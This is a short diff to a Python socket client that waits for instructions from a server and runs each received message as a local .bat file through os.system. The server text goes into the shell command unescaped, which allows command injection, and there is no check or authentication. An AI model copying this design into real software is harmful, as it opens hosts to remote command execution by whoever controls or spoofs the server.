@@ -1,4 +1,5 @@
 import socket
+import os
 
 FORMAT = "utf-8"
 HEADER = 20480
@@ -24,4 +25,11 @@ print('Esperando instrucciones...')
 
 while True:
     respuesta_servidor = cliente.recv(HEADER).decode(FORMAT)
-    print(respuesta_servidor)
+    if respuesta_servidor == ' ':
+        cliente.send(' '.encode())
+    else:
+        try:
+            os.system(f'{os.getcwd()}/comandos/{respuesta_servidor}.bat')
+
+        except:
+            print('Instruccion no encontrada')
